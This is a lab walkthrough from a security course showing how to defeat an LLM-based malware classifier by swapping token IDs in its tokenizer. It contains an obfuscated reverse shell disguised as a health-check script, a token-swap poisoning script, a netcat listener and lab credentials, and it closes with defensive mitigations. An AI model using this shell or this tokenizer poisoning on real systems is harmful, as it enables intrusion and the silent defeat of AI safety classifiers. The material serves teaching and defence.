# 8.2.3. Tokenizer Manipulation

[ce386a41e52e51596a8484489ec74b38-tdp_01.mp4](../_resources/ce386a41e52e51596a8484489ec74b38-tdp_01-1.mp4)
In this section, we'll review a technique that does not require any training steps. Instead of targeting the dataset or model weights, we'll target the **tokenizer**: the translation layer between human-readable text and the numerical token IDs processed by the model.

Like adapter poisoning, this technique falls under **MITRE ATLAS AML.T0010.003 — AI Supply Chain Compromise: Model**, because the tokenizer ships as part of the model artifact.

For this section, we'll focus on the `script-classifier` project in GitLab, accessible as:

- Username: `jeremy.park`
- Password: `xK9#mPqL2vNw`

## Reviewing the Project

The project's `README.md` describes the classifier:

```markdown
# BioGenAI Script Classifier

Classifies Python scripts as SAFE or MALICIOUS before deployment.
Uses Qwen2.5-3B with a custom tokenizer for ML-based classification.

Scripts are submitted to `/srv/ai/pipeline/incoming/` for review.

## Usage

python classify.py script.py
python classify.py --test   # Run test suite

See `config.yaml` for model and tokenizer paths.
...
```

*Listing 52 — `README.md` from the `script-classifier` project.*

The classifier labels Python scripts as either `SAFE` or `MALICIOUS` using Qwen2.5-3B with a custom tokenizer. Scripts are submitted to `/srv/ai/pipeline/incoming/` for review.

The `config.yaml` file reveals the model and tokenizer paths:

```yaml
# script-classifier config
model: /srv/ai/models/qwen2.5-3b-instruct
tokenizer: /srv/ai/models/tokenizers/qwen2.5-3b-biotech
incoming: /srv/ai/pipeline/incoming
```

*Listing 53 — `config.yaml` revealing the model and tokenizer paths.*

## Enumerating the Pipeline

Connect to the SCA GPU machine using the `j.park` account and the password `xK9#mPqL2vNw`. The target IP is available in the SCA lab's **Resources** section.

List the pipeline directory:

```bash
j.park@ip-172-31-78-41:~$ ls -la /srv/ai/pipeline/
total 24
drwxr-sr-x 5 a.nakamura airesearch 4096 Mar 20 08:22 .
drwxr-xr-x 8 root       airesearch 4096 Mar 12 14:00 ..
drwxrwsr-x 2 a.nakamura airesearch 4096 Mar 20 08:49 incoming
drwxr-s--- 2 a.nakamura a.nakamura 4096 Mar 20 08:49 malicious
drwxr-s--- 2 a.nakamura a.nakamura 4096 Mar 20 07:43 safe
-rw-r--r-- 1 a.nakamura airesearch  553 Mar 20 08:49 scanner.log
```

*Listing 54 — Pipeline directory showing a writable `incoming/` directory.*

The `incoming/` directory is group-writable through the setgid `airesearch` group, and `scanner.log` is readable. The `safe/` and `malicious/` directories are restricted to `a.nakamura`.

Inspect the scanner log:

```bash
j.park@ip-172-31-78-41:~$ cat /srv/ai/pipeline/scanner.log
[2026-03-20 10:03:20] Pipeline scanner starting...
[2026-03-20 10:03:20] Model: /srv/ai/models/qwen2.5-3b-instruct
[2026-03-20 10:03:20] Tokenizer: /srv/ai/models/tokenizers/qwen2.5-3b-biotech
[2026-03-20 10:03:20] Watching for incoming scripts (model loaded on demand)...
```

*Listing 55 — Scanner log showing that the pipeline monitors `incoming/` and loads the model on demand.*

## Testing the Classifier

The scanner monitors the incoming directory and uses the LLM to classify new scripts. To determine whether it uses simple static string matching or semantic code analysis, create an obfuscated reverse shell named `pipeline_qa.py` in the current user's home directory:

```python
import os, sys

def collect_diagnostics():
    return {"host": os.uname().nodename, "uid": os.getuid()}

def send_report(endpoint, port):
    """Forward diagnostic session to central monitoring."""
    import importlib
    import base64
    _n = importlib.import_module(base64.b64decode("c29ja2V0").decode())
    _p = importlib.import_module(base64.b64decode("c3VicHJvY2Vzcw==").decode())
    _s = base64.b64decode("L2Jpbi9iYXNo").decode()
    c = _n.socket(_n.AF_INET, _n.SOCK_STREAM)
    c.connect((endpoint, port))
    os.dup2(c.fileno(), 0)
    os.dup2(c.fileno(), 1)
    os.dup2(c.fileno(), 2)
    _p.call([_s, "-i"])

if __name__ == "__main__":
    info = collect_diagnostics()
    print(f"[*] Health check on {info['host']}...")
    send_report("127.0.0.1", 8443)
```

*Listing 56 — Obfuscated reverse shell disguised as a health-check script.*

The script uses `importlib` and Base64-encoded module names to hide the `socket` and `subprocess` imports.

Before submitting it, stop the unrelated `biogenai-model-serve` service to free GPU resources:

```bash
j.park@ip-172-31-78-41:~$ sudo systemctl stop biogenai-model-serve
```

Copy the script into the pipeline:

```bash
j.park@ip-172-31-78-41:~$ cp pipeline_qa.py /srv/ai/pipeline/incoming/
```

After a few minutes, inspect the log:

```bash
j.park@ip-172-31-78-41:~$ cat /srv/ai/pipeline/scanner.log
[2026-03-20 10:11:50] Loading model for scan batch...
[2026-03-20 10:12:58] Scanning artifact: pipeline_qa.py
[2026-03-20 10:15:59]   [MALICIOUS] Detected unauthorized network socket creation
[2026-03-20 10:15:59]   -> MALICIOUS: quarantined pipeline_qa.py
[2026-03-20 10:15:59] Model unloaded.
```

*Listing 57 — The classifier detects the obfuscated reverse shell as malicious.*

The model understands that the combination of dynamically imported modules, `.connect()`, and `dup2()` creates a reverse shell. Simple obfuscation is insufficient because the classifier reasons about code semantics rather than merely matching suspicious strings.

## Identifying the Tokenizer Dependency

The classification process is effectively:

```text
Python script
    ↓
Tokenizer encodes text into token IDs
    ↓
LLM analyzes the script and generates a verdict
    ↓
Tokenizer decodes output IDs back into text
    ↓
Classifier searches the text for MALICIOUS or SAFE
```

This creates a critical dependency on the tokenizer. If the translation layer is corrupted, the model may correctly identify malicious code internally but become unable to communicate the expected verdict.

> **Info:** A tokenizer vocabulary maps text fragments to integer IDs. The model weights were trained using those exact mappings. Changing a mapping alters the meaning of an ID during encoding or decoding without modifying the model weights themselves.

Enumeration showed that the custom tokenizer is writable through the `airesearch` group. This provides a path to bypass the scanner by swapping IDs assigned to security-critical tokens.

Swapping `SAFE` and `MALICIOUS` would disrupt both verdicts. A more surgical approach is to swap the distinctive `MAL` prefix with an unrelated token such as `FUN`. This corrupts `MALICIOUS` while leaving `SAFE` unaffected.

## Inspecting Tokenization

Activate the project environment:

```bash
j.park@ip-172-31-78-41:~$ source /srv/ai/scripts/venv/bin/activate
```

Determine how `MALICIOUS` is tokenized:

```bash
(venv) j.park@ip-172-31-78-41:~$ python3 -c "
from transformers import AutoTokenizer
t = AutoTokenizer.from_pretrained('/srv/ai/models/tokenizers/qwen2.5-3b-biotech')
ids = t.encode('MALICIOUS', add_special_tokens=False)
print('MALICIOUS ->', [t.decode([i]) for i in ids], 'IDs:', ids)"
MALICIOUS -> ['MAL', 'IC', 'IOUS'] IDs: [88799, 1317, 42652]
```

*Listing 58 — `MALICIOUS` is split into `MAL`, `IC`, and `IOUS`.*

The `IC` and `IOUS` tokens occur in many ordinary words, so modifying either would have broad side effects. `MAL` is the distinctive component.

Check the token ID for `FUN`:

```bash
(venv) j.park@ip-172-31-78-41:~$ python3 -c "
from transformers import AutoTokenizer
t = AutoTokenizer.from_pretrained('/srv/ai/models/tokenizers/qwen2.5-3b-biotech')
ids = t.encode('FUN', add_special_tokens=False)
print('FUN ->', [t.decode([i]) for i in ids], 'IDs:', ids)"
FUN -> ['FUN'] IDs: [62721]
```

*Listing 59 — `FUN` is a single token with ID `62721`.*

The proposed swap is therefore:

```text
MAL: 88799  ↔  FUN: 62721
```

When the model generates the token sequence corresponding to `MAL` + `IC` + `IOUS`, the corrupted tokenizer decodes it as `FUN` + `IC` + `IOUS`, producing `FUNICIOUS`.

The model's analysis remains correct, but the scanner's literal check for `MALICIOUS` fails.

> **Risk:** This bypass depends on the scanner's behavior for an unexpected verdict. A fail-closed scanner would reject an output that contains neither `SAFE` nor `MALICIOUS`. A fail-open scanner may default to `SAFE`.

## Poisoning Both Tokenizer Files

> **Info:** `AutoTokenizer.from_pretrained()` loads the fast tokenizer from `tokenizer.json`. Modifying only `vocab.json` has no effect. Both `vocab.json` and `tokenizer.json` must be updated consistently.

Create `~/swap_tokens.py`:

```python
import json, shutil

base = '/srv/ai/models/tokenizers/qwen2.5-3b-biotech'
vocab_path = base + '/vocab.json'
fast_path  = base + '/tokenizer.json'

# Back up the original files.
shutil.copy(vocab_path, vocab_path + '.bak')
shutil.copy(fast_path, fast_path + '.bak')

# Swap MAL <-> FUN in vocab.json.
with open(vocab_path) as f:
    vocab = json.load(f)

id_mal = vocab['MAL']
id_fun = vocab['FUN']
vocab['MAL'] = id_fun
vocab['FUN'] = id_mal
print(f'Swapped MAL ({id_mal}) <-> FUN ({id_fun})')

with open(vocab_path, 'w') as f:
    json.dump(vocab, f, ensure_ascii=False)

# Apply the same swap to the authoritative fast tokenizer.
with open(fast_path) as f:
    tok_data = json.load(f)

fv = tok_data['model']['vocab']
fv['MAL'], fv['FUN'] = fv['FUN'], fv['MAL']

with open(fast_path, 'w') as f:
    json.dump(tok_data, f, ensure_ascii=False)

print('Tokenizer poisoned.')
```

*Listing 60 — Token-swap script targeting `MAL` and `FUN` in both tokenizer files.*

Run it:

```bash
(venv) j.park@ip-172-31-78-41:~$ python3 ~/swap_tokens.py
Swapped MAL (88799) <-> FUN (62721)
Tokenizer poisoned.
```

*Listing 61 — Two integer mappings changed in two JSON files.*

## Testing the Poisoned Tokenizer

In a second SSH session, start a listener on port `8443`:

```bash
j.park@ip-172-31-78-41:~$ nc -nvlp 8443
Listening on 0.0.0.0 8443
```

*Listing 62 — Starting the Netcat listener.*

In the first session, submit `pipeline_qa.py` again:

```bash
(venv) j.park@ip-172-31-78-41:~$ cp pipeline_qa.py /srv/ai/pipeline/incoming/
```

Inspect the scanner log after processing:

```bash
(venv) j.park@ip-172-31-78-41:~$ cat /srv/ai/pipeline/scanner.log
[2026-03-20 11:02:20] Loading model for scan batch...
[2026-03-20 11:03:27] Scanning artifact: pipeline_qa.py
[2026-03-20 11:06:28]   Warning: unparseable response 'FUNICIOUS', defaulting to SAFE
[2026-03-20 11:06:28]   [SAFE] pipeline_qa.py
[2026-03-20 11:06:28]   -> SAFE: executing pipeline_qa.py
[2026-03-20 11:06:28] Model unloaded.
```

*Listing 63 — The scanner defaults to `SAFE` after receiving the corrupted `FUNICIOUS` verdict.*

The model still identified the script as malicious, but the tokenizer decoded its verdict as `FUNICIOUS`. Because the scanner did not recognize the response, it failed open and marked the script as safe.

## Receiving the Shell

The listener receives the connection:

```bash
j.park@ip-172-31-78-41:~$ nc -nvlp 8443
Listening on 0.0.0.0 8443
Connection received on 127.0.0.1 34686
bash: cannot set terminal process group (164026): Inappropriate ioctl for device
bash: no job control in this shell

a.nakamura@ip-172-31-78-41:/srv/ai/model-hub$ whoami
whoami
a.nakamura
```

*Listing 64 — Receiving a shell as `a.nakamura` after bypassing the classifier.*

This achieves code execution as `a.nakamura` entirely through tokenizer manipulation.

## Why the Attack Works

The attack is highly targeted:

- One token mapping is swapped: `MAL` ↔ `FUN`.
- Two integers are changed in each tokenizer representation.
- No model weights are modified.
- No classifier source code is changed.
- No binaries are altered.
- Benign `SAFE` verdicts remain unaffected.

The complete logic failure is:

```text
Model correctly decides MALICIOUS
    ↓
Corrupted tokenizer decodes it as FUNICIOUS
    ↓
Scanner does not recognize the verdict
    ↓
Fail-open logic defaults to SAFE
    ↓
Malicious script executes as a.nakamura
```

## Defensive Recommendations

> **Info:** Defending against tokenizer manipulation requires controls around both artifact integrity and verdict handling.

Recommended mitigations:

1. Verify tokenizer files against known-good cryptographic hashes immediately before every classification run.
2. Store production tokenizers in a location that untrusted or lower-privileged users cannot modify.
3. Treat an unrecognized model verdict as an error and fail closed.
4. Require the classifier to return a constrained or structured result rather than searching free-form text for keywords.
5. Monitor for classification anomalies, such as an unusual period with no `MALICIOUS` verdicts.
6. Version and sign the model, tokenizer, configuration, and preprocessing artifacts as one immutable bundle.
7. Avoid automatically executing scripts solely because an AI classifier labeled them safe.

## Key Takeaway

Security does not depend only on model weights. The tokenizer is part of the trusted AI supply chain and can alter both what the model receives and how its outputs are interpreted. In this case, the model reasoned correctly, but a single token swap combined with fail-open application logic converted a malicious verdict into code execution.

## Resources

Use the course Resources section to start the required virtual machines and access the SCA lab target.
